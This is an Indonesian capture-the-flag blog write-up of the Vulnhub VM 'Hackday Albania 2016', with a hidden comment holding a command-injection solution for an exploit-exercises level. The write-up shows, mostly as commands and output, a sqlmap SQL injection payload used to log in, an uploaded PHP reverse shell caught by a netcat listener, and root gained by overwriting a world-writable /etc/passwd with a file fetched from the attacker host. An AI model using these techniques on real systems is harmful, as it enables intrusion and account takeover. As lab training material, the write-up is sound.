<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Hackday - Albania 2016 Write Up</title>
  <meta name="description" content="Executive Summary">
  
  <meta name="author" content="rhama">
  <meta name="copyright" content="&copy; rhama 2018">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
<!--   <meta property="og:description" content="Executive Summary" />
  <meta property="og:url" content="https://rhama.my.id" />
  <meta property="og:site_name" content="CTF.Ninja" />
  <meta property="og:title" content="Hackday - Albania 2016 Write Up" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://rhama.my.id/assets/images/pentest.jpg" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" /> -->
<meta content="https://rhama.my.id/assets/images/pentest.jpg" property="og:image" />
<meta content="CTF.Ninja" property="og:site_name" />
<meta content="object" property="og:type" />
<meta content="Hackday - Albania 2016 Write Up" property="og:title" />
<meta content="https://rhama.my.id/pentesting/2017/03/25/hackday-albania-2016-writeup.html" property="og:url" />
<meta content="Executive Summary" property="og:description" />

  

  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
   <link rel="stylesheet" href="/css/terminal.css">
  <link rel="canonical" href="https://rhama.my.id/pentesting/2017/03/25/hackday-albania-2016-writeup.html">
  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="CTF.Ninja">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
          <li class="nav-link"><a href="/posts/">Archives</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/images/pentest.jpg);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Hackday - Albania 2016 Write Up</h1>
      <p class="info">by <strong>Aiden Pearce</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">March 25, 2017</div>
  <div class="post-categories">
  in 
    
    <a href="/category/Pentesting">Pentesting</a>
    
  
  </div>
</section>

<article class="post-content">
  <h1 id="executive-summary">Executive Summary</h1>

<p>Hackday : Albania 2016 adalah VM yang saya dapatkan dari vulnhub.com, VM ini memiliki 2 service yang berjalan, SSH pada port <em>default</em> dan Web Server pada port 8008 serta terdapat web apps yang vulnerable terhadap serangan SQL Injection.</p>

<h2 id="quick-poc">Quick POC</h2>

<ol>
  <li>Scanning Live Host menggunakan <code class="highlighter-rouge">nmap</code></li>
  <li>Port 8080 adalah port yang digunakan untuk menjalankan webserver</li>
  <li>robots.txt untuk melihat directory dan akan mengarahkan ke web apps yang vulnerable terhdapat serangan SQl Injection</li>
  <li>Sql Injection terdapat pada parameter username di form login</li>
  <li>Inject menggunakan <code class="highlighter-rouge">sqlmap</code> dan didapatkan payload yang digunakan untuk login</li>
  <li>Upload file php reverse shell untuk mendapatkan akses ke server</li>
  <li>Dengan menggunakan command <code class="highlighter-rouge">find</code>, didapatkan file <code class="highlighter-rouge">/etc/passwd</code> dalam keadaan writeable untuk other</li>
  <li>Update password pada salah satu user ( yang memiliki akses tinggi, ex : sudoers) di <code class="highlighter-rouge">/etc/passwd</code></li>
  <li>Akses <code class="highlighter-rouge">/bin/bash</code> dengan menggunakan sudo command untuk mendapatkan root akses</li>
  <li>Get the flag :p</li>
</ol>

<h1 id="proof-of-concept">Proof Of Concept</h1>

<h3 id="live-host-scanning-using-nmap">1. Live Host Scanning Using Nmap</h3>
<p>Saya melukan live host scanning untuk mengetahui ip dari system hackday sehingga dapat mempersempit scanning service enumeration , dan didapatkan ip <code class="highlighter-rouge">192.168.10.101</code> yang digunakan oleh system hackday</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday : nmap -sn -T4 192.168.10.1/24

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-23 08:31 WIB
Nmap scan report for 192.168.10.1
Host is up (0.00073s latency).
Nmap scan report for 192.168.10.101
Host is up (0.00096s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 15.36 seconds</code></pre></figure>

<p>1.png</p>

<h3 id="service-enumeration-using-nmap">2. Service Enumeration Using Nmap</h3>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday nmap -A -sV -T4 192.168.10.101 

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-23 08:41 WIB
Nmap scan report for 192.168.10.101
Host is up (0.0013s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)
|_  256 21:fe:63:45:2c:cb:a1:f1:b6:ba:36:dd:ed:d3:d9:48 (ECDSA)
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 26 disallowed entries (15 shown)
| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/ 
| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/ 
| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/ 
|_/unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HackDay Albania 2016
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds</code></pre></figure>

<p>Dari hasil scanning <code class="highlighter-rouge">Nmap</code> terdapat 2 open port yaitu port 22 port default untuk SSH dan port 8008 port untuk Web Server.</p>

<h2 id="robotstxt-parser-and-directory-scanner">3. robots.txt Parser And Directory Scanner</h2>

<p>Dari hasil scanning menggunakan <code class="highlighter-rouge">nmap</code>, terdapat robots.txt yang berisi banyak directory yang <em>disallow</em> yang dapat kita jadikan wordlist untuk mencari directory yang mungkin terdapat <em>Vulnerable Web Apps</em> didalam nya sehingga dapat membawa kita mendapatkan akses ke system hackday. 
Saat mencoba mengakses directory yang berada di robots.txt halaman tersebut memiliki content yang sama.</p>

<p><img src="/img/hackday/gambar_sama.png" alt="web-content" class="img-responsive" /></p>

<p>Saya membuat script python untuk menghitung <em>Content-Lenght</em> dari list directory sehingga bisa membandingkan Content atau isi dari directory tersebut tanpa perlu menklik satu per satu.</p>

<p>Gunakan <code class="highlighter-rouge">curl</code> untuk mendapatkan list directory di robots.txt</p>

<p><code class="highlighter-rouge">curl http://192.168.10.101:8008/robots.txt | cut -d "/" -f2 &gt; webdir.txt</code></p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#Content-Length Identifier</span>
<span class="c">#cl-identifier.py</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"webdir.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">words</span><span class="p">:</span>
  <span class="n">words</span> <span class="o">=</span> <span class="n">words</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
  <span class="n">URL</span> <span class="o">=</span> <span class="s">"http://192.168.10.101:8008/</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">word</span><span class="p">)</span>
  <span class="c">#print URL</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
  <span class="k">print</span> <span class="s">"</span><span class="si">%</span><span class="s">s : </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">URL</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>                               </code></pre></figure>

<p>Setelah menjalankan script <code class="highlighter-rouge">cl-identifier.py</code> didapatkan directory <em>unisxcudkqjydw</em> memiliki panjang content yang berbeda, sehingga dapat saya simpulkan content tersebut bukankan content yang sama seperti sebelumnya.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday python cl-identifier.py
http://192.168.10.101:8008/rkfpuzrahngvat : 165
http://192.168.10.101:8008/slgqvasbiohwbu : 165
http://192.168.10.101:8008/tmhrwbtcjpixcv : 165
http://192.168.10.101:8008/vojtydvelrkzex : 165
http://192.168.10.101:8008/wpkuzewfmslafy : 165
http://192.168.10.101:8008/xqlvafxgntmbgz : 165
http://192.168.10.101:8008/yrmwbgyhouncha : 165
http://192.168.10.101:8008/zsnxchzipvodib : 165
http://192.168.10.101:8008/atoydiajqwpejc : 165
http://192.168.10.101:8008/bupzejbkrxqfkd : 165
http://192.168.10.101:8008/cvqafkclsyrgle : 165
http://192.168.10.101:8008/unisxcudkqjydw : 37
http://192.168.10.101:8008/dwrbgldmtzshmf : 165
http://192.168.10.101:8008/exschmenuating : 165
http://192.168.10.101:8008/fytdinfovbujoh : 165
http://192.168.10.101:8008/gzuejogpwcvkpi : 165
http://192.168.10.101:8008/havfkphqxdwlqj : 165
http://192.168.10.101:8008/ibwglqiryexmrk : 165
http://192.168.10.101:8008/jcxhmrjszfynsl : 165
http://192.168.10.101:8008/kdyinsktagzotm : 165
http://192.168.10.101:8008/lezjotlubhapun : 165
http://192.168.10.101:8008/mfakpumvcibqvo : 165
http://192.168.10.101:8008/ngblqvnwdjcrwp : 165
http://192.168.10.101:8008/ohcmrwoxekdsxq : 165
http://192.168.10.101:8008/pidnsxpyfletyr : 165
http://192.168.10.101:8008/qjeotyqzgmfuzs : 165</code></pre></figure>

<h2 id="very-secure-bank-website">4. Very Secure BANK Website</h2>

<p>Apabila kita mengakses directory <em>unisxcudkqjydw</em>, kita akan mendapatkan <code class="highlighter-rouge">path</code> dimana website “Very Secure BANK” berada.</p>

<p><img src="/img/hackday/very_secure_bank_web.png" alt="Sql-Injection-error" class="img-responsive" /></p>

<p>Setelah dilakukan investigasi “asal-asalan”, halaman login website “Very Secure BANK” vulnerable terhadap serangan <code class="highlighter-rouge">POST SQL Injection</code> tepatnya pada parameter username</p>

<p><img src="/img/hackday/sqli_error.png" alt="Sql-Injection-error" class="img-responsive" /></p>

<h2 id="post-sql-injection-attack-using-sqlmap">5. POST SQL Injection Attack Using Sqlmap</h2>

<p>Dengan bantuan <code class="highlighter-rouge">sqlmap</code> kita dengan mudah dapat mengeksploitasi bug SQL Injection tersebut</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday sqlmap -u http://192.168.10.101:8008/unisxcudkqjydw//vulnbank/client/login.php --data "username=admin*&amp;password=admin" -p username --dbs -T4 --level 4 --risk 3
         _
 ___ ___| |_____ ___ ___  {1.0.4.0#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:30:36

custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n/q] Y
[23:30:38] [INFO] resuming back-end DBMS 'mysql' 
[23:30:38] [INFO] testing connection to the target URL
---
Parameter: #1* ((custom) POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind (SELECT - comment)
    Payload: username=admin' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))rtEp)#&amp;password=admin
---
[23:30:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.18, PHP 7.0.8
back-end DBMS: MySQL 5.0.12
[23:30:39] [INFO] fetching database names
[23:30:39] [INFO] fetching number of databases
[23:30:39] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
[23:30:39] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptions 
[23:30:39] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[23:30:39] [ERROR] unable to retrieve the number of databases
[23:30:39] [INFO] falling back to current database
[23:30:39] [INFO] fetching current database
[23:30:39] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</code></pre></figure>

<p>Saya menggunakan <em>payload</em> yang dihasilkan oleh <code class="highlighter-rouge">sqlmap</code> untuk login di website Very Secure BANK</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">username=admin' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))rtEp)#
password=admin</code></pre></figure>

<p>Dengan menggunakan username dan password diatas, voila ! <em>Access Granted</em>…</p>

<p><img src="/img/hackday/loged_in_website.png" alt="web-logged-in" class="img-responsive" /></p>

<h2 id="plant-the-backdoor">6. Plant The Backdoor</h2>

<p>Dengan memanfaatkan <em>Upload Form</em> dibagian <em>Contact Support</em>, kita bisa memasang <em>PHP Backdoor</em>. Untuk diketahui, Upload Form tersebut melakukan <em>filtering</em> terhadap ekstensi file, sehingga hanya file berekstensi <code class="highlighter-rouge">.jpg</code> yang dapat diupload. Saya menggunakan <code class="highlighter-rouge">php-reverse-shell</code> yang saya dapatkan dari situs <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a> yang sudah direname menjad <code class="highlighter-rouge">php-reverse-shell.php.jpg</code>.</p>

<p>Setelah sukses mengupload reverse shell tersebut, saya awal nya berpikir <code class="highlighter-rouge">php-reverse-shell.php.jpg</code> tidak bisa tereksekusi karena berekstensi <code class="highlighter-rouge">.jpg</code>, tapi ternyata <em>Listener</em> <code class="highlighter-rouge">nc -vlp 2121</code> mendapatkan koneksi dari reverse shell yang diupload. Hal ini mungkin disebabkan oleh penggunaan fungsi <code class="highlighter-rouge">include(file_name)</code> pada PHP sehingga memungkinkan <em>backdoor</em> yang kita upload tereksekusi.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday nc -vlp 2121
Listening on [0.0.0.0] (family 0, port 2121)
Connection from [192.168.10.101] port 2121 [tcp/iprop] accepted (family 2, sport 49492)
Linux hackday 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 06:26:55 up 30 min,  0 users,  load average: 0.06, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ </code></pre></figure>

<h2 id="priviliege-escalation">7. Priviliege Escalation</h2>
<p>Setelah mendapatkan Shell Access hasil dari <em>reverse connection</em> sebelumnya, saya melakukan <em>Spawning TTY Shell</em> agar mendapatkan shell yang lebih baik. Berbagai teknik untuk Spawning TTY Shell dapat dilihat disitus <a href="http://netsec.ws/?p=337">Netsec</a>.
Dikarenakan python (versi 2) tidak terinstall, tapi python3 yang terinstall kita tetap bisa menspawning karena syntax nya sama.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hackday:/$ export TERM=xterm
export TERM=xterm
www-data@hackday:/$ </code></pre></figure>

<p>Untuk next step saya mengikuti <em>Basic Priviliege Escalation</em> di blog <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmilk</a></p>

<p>Saya mencoba mencari <em>suid permission</em>  menggunakan command <code class="highlighter-rouge">find / -perm -2000 2&gt;/dev/null</code> tetapi tidak menemukan menarik.</p>

<h4 id="so-what-we-must-to-do-">So What We Must To Do ?</h4>
<p>Saat mencoba mencari <em>Writable File</em> menggunakan command <code class="highlighter-rouge">find / -xdev -writable 2&gt;/dev/null</code> file <code class="highlighter-rouge">/etc/passwd</code> berada dipaling atas.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">www-data@hackday:/$ find / -xdev -writable 2&gt;/dev/null
find / -xdev -writable 2&gt;/dev/null
/etc/passwd
/etc/systemd/system/inetd.service
/tmp</code></pre></figure>

<p>Apabila file <code class="highlighter-rouge">/etc/passwd</code> dalam keadaan Wriable itu akan menjadi bencana, karena kita dapat dengan mudah mengganti password user active di system hackday.</p>

<p>Saya menyalin isi dari file /etc/passwd ke local system saya sehingga dapat dengan mudah mengedit password.
Untuk mengenerate password, dapat digunakan <code class="highlighter-rouge">openssl</code>.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">➜  hackday openssl passwd -1 passw0rd
$1$FhytX.J/$cb/k7Fmg4LlTu9f8XDgux1
➜  Web cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
taviso:$1$FhytX.J/$cb/k7Fmg4LlTu9f8XDgux1:1000:1000:Taviso,,,:/home/taviso:/bin/bash</code></pre></figure>

<p>Saya memilih user <code class="highlighter-rouge">taviso</code> karena user tersebut berada didalam grup <code class="highlighter-rouge">sudo</code></p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">www-data@hackday:/tmp$ cat /etc/group | grep sudo
sudo:x:27:taviso</code></pre></figure>

<p>Saya memindahkan file passwd yang sudah saya ganti password nya ke <em>Document Root</em> apache2 sehingga bisa ditranser ke system hackday, sebenar nya untuk mentransfer file bisa juga menggunakan <code class="highlighter-rouge">nc</code> tetapi saya menggunakan <code class="highlighter-rouge">curl</code> untuk mentransfer file passwd tersebut.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">www-data@hackday:/tmp$ curl 192.168.10.1/passwd -O               
curl 192.168.10.1/passwd -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1657  100  1657    0     0   148k      0 --:--:-- --:--:-- --:--:--  179k</code></pre></figure>

<p>Setelah itu mari kita timpa file <code class="highlighter-rouge">/etc/passwd</code> dengan file <code class="highlighter-rouge">passwd</code> yang sudah kita edit.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">www-data@hackday:/tmp$ cp passwd /etc/passwd
cp passwd /etc/passwd
www-data@hackday:/tmp$ su taviso
su taviso
Password: passw0rd

taviso@hackday:/tmp$ sudo -l
sudo -l
[sudo] password for taviso: passw0rd

Matching Defaults entries for taviso on hackday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User taviso may run the following commands on hackday:
    (ALL : ALL) ALL


Voila ! Access Granted</code></pre></figure>

<h2 id="get-the-flag">8. Get The Flag</h2>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql">taviso@hackday:/tmp$ sudo su 
root@hackday:/tmp# cd /root
root@hackday:~# ls
ls
flag.txt
root@hackday:~# cat flag.txt
cat flag.txt
Urime, 
Tani nis raportin!

d5ed38fdbf28bc4e58be142cf5a17cf5</code></pre></figure>

<p>Didapatkan flag untuk Chellenge ini : d5ed38fdbf28bc4e58be142cf5a17cf5</p>

<!-- Executive Summary
====================================
Challenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program

# About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

Source code
====================================

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#include &lt;stdlib.h&gt;</span>
<span class="c">#include &lt;unistd.h&gt;</span>
<span class="c">#include &lt;string.h&gt;</span>
<span class="c">#include &lt;sys/types.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>

int main<span class="o">(</span>int argc, char <span class="k">**</span>argv, char <span class="k">**</span>envp<span class="o">)</span>
<span class="o">{</span>
  char <span class="k">*</span>buffer;

  gid_t gid;
  uid_t uid;

  gid <span class="o">=</span> getegid<span class="o">()</span>;
  uid <span class="o">=</span> geteuid<span class="o">()</span>;

  setresgid<span class="o">(</span>gid, gid, gid<span class="o">)</span>;
  setresuid<span class="o">(</span>uid, uid, uid<span class="o">)</span>;

  buffer <span class="o">=</span> NULL;

  asprintf<span class="o">(</span>&amp;buffer, <span class="s2">"/bin/echo %s is cool"</span>, getenv<span class="o">(</span><span class="s2">"USER"</span><span class="o">))</span>;
  <span class="nb">printf</span><span class="o">(</span><span class="s2">"about to call system(</span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2">)</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span>;
  
  system<span class="o">(</span>buffer<span class="o">)</span>;
<span class="o">}</span></code></pre></figure>


Proof Of Concept
====================================
Pada source code .c diatas terdapat fungsi asprintf untuk melakukan _Concatenating strings_ dengan mengambil value dari $USER yang dipanggil oleh fungsi getenv()

Untuk menyelesaikan challenge ini, kita dapat mengganti value dari $USER sehingga dapat menjalankan command yang kita inginkan.



<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sh-4.2$ </span><span class="nv">USER</span><span class="o">=</span><span class="s2">"AAA;getflag"</span>
<span class="gp">sh-4.2$ </span>./flag02
about to call system<span class="o">(</span><span class="s2">"/bin/echo AAA;getflag is cool"</span><span class="o">)</span>
AAA
You have successfully executed getflag on a target account</code></pre></figure>

 -->

</article>



<section class="tags">
  <strong>Tags:</strong> <a href="/tag/Pentesting">Pentesting</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Hackday+-+Albania+2016+Write+Up&u=https%3A%2F%2Frhama.my.id%2Fpentesting%2F2017%2F03%2F25%2Fhackday-albania-2016-writeup.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/pentesting/2017/03/25/hackday-albania-2016-writeup.html') + '&title=Hackday - Albania 2016 Write Up'; return false">
        <i class="fa fa-reddit-square fa-lg"></i>
      </a>
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">CTF.Ninja</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
          <li class="nav-link"><a href="/posts/">Archives</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:r4m@protonmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">r4m@protonmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
              <i class="fa fa-facebook"></i>
              <span class="username">eat.sleep.pwn.repeat</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">CTF, InfoSec, Banana And More.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
